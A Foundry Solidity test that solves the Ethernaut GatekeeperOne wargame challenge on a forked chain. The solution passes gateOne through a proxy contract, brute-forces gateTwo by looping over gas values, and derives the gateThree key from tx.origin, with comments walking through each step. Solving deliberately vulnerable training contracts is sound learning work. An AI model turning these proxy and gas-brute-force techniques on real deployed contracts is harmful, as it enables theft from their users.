// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import "forge-std/Test.sol";

// for this challenge, player needs to be tx.origin
// let's skip the middleman just once.
interface IFactory {
  function createInstance(address _player) external payable returns (address);
  function validateInstance(address payable _instance, address _player) external returns (bool);
}

contract Proxy {
  address internal challengeAddress;

  constructor(address _challengeAddress) {
    challengeAddress = _challengeAddress;
  }

  function enter(bytes8 _key) external returns (bool) {
    (bool success,) = challengeAddress.call(abi.encodeWithSignature("enter(bytes8)", _key));
    return success;
  }
}

contract GatekeeperOneTest is Test {
  IFactory internal challengeFactory;
  address internal challengeAddress;

  function setUp() public {
    // As we are not using the utils library, we need to fork here.
    vm.createSelectFork(vm.envString("RPC_URL"), vm.parseUint(vm.envString("BLOCK_NUMBER")));
    challengeFactory = IFactory(0x403fd9c5c69D3A6E8c02fD813Fc33af060B642E3);
    challengeAddress = challengeFactory.createInstance(tx.origin);
  }

  function testExploit() public {
    // gateOne
    //   is passed through by using a proxy contract
    //
    // gateTwo
    //   just brute force it,
    //   these tests are running in a fork
    //
    // gateThree
    //   console.log() the operations on 0x1122334455667788
    //   use your fav REPL to get the hex conversions
    //
    //    uint32(uint64(_gateKey))   -> 0x1122334455667788 => 0x55667788
    //    uint16(uint64(_gateKey))   -> 0x1122334455667788 => 0x00007788
    //    uint64(_gateKey)           -> 0x1122334455667788 => 0x1122334455667788
    //    uint16(uint160(tx.origin)) -> 0x00a3...ea72 => ea72
    //
    //    gateThree part one can be true with 0x1122334400007788
    //    gateThree part two needs both to be different, which is true
    //    gateThree part three, make 7788 equal to the last hex digits of tx.origin
    //      ex: 0x1122334400007788 => 0x112233440000ea72
    //      in fact, it can be 0x100000000000ea72,
    //      which makes it straighforward to get analytically.

    Proxy proxy = new Proxy(challengeAddress);
    bytes8 key = bytes8(uint16(uint160(tx.origin)) + 0x1000000000000000);

    // this loop is to brute-force the gateTwo
    for (uint i = 27000; i > 0; i--) {
      if (proxy.enter{gas: i}(key)) {
        require(challengeFactory.validateInstance(payable(challengeAddress), tx.origin));
        break;
      }
    }
  }
}
